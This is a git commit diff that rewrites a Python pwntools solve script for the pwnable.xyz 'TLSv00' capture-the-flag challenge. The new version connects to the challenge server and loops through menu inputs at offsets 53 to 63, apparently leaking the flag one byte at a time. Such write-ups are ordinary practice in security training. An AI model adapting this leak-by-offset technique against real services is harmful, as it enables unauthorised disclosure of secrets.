33f08ae50fcefabebf2de34729b6367ca610aef1
sonysame <sonysame@naver.com>
2019-02-07 12:24:29 -0800

    FLAG...

--- TLSv00_sol.py
+++ TLSv00_sol.py
@@ -1,21 +1,34 @@
 from pwn import*
+import sys
+#s=process("./challenge")
+#pause()
+s=remote("svc.pwnable.xyz","30006")
+#k=sys.argv[1]
+s.recv(1024)
+for k in range(53,64):
+		
+	s.send("1\n")
+	s.recv(1024)
+	s.send(str(k)+"\n")
+	s.recv(1024)
+	s.send("2\n")
+	s.recv(1024)
+	s.send("3\n")
+	s.recv(1024)
+	s.send("y")
+	s.recv(1024)
+	s.send("abcd\n")
+	s.recv(1024)
+	s.send("1\n")
+	s.recv(1024)
+	s.send("64\n")
+	s.recv(1024)
+	s.send("3\n")
+	s.recv(1024)
+	s.send("n")
 
-s=remote("svc.pwnable.xyz", '30006')
-print (s.recv(1024))
-print (s.recv(1024))
-s.send("3\n")
-print(s.recv(1024))
-print(s.recv(1024))
-s.send("y\n")
-print(s.recv(1024))
-s.send("\x001234")
-print(s.recv(1024))
-#print(s.recv(1024))
-#s.send("3\n")
-#print(s.recv(1024))
-#s.send("n\n")
+	print s.recv(1024)[k],
 
-pause()
-s.interactive()
-
-s.close()
+	
+#WARNING: NOT IMPLEMENTED.
+#Wanna take a survey instead?
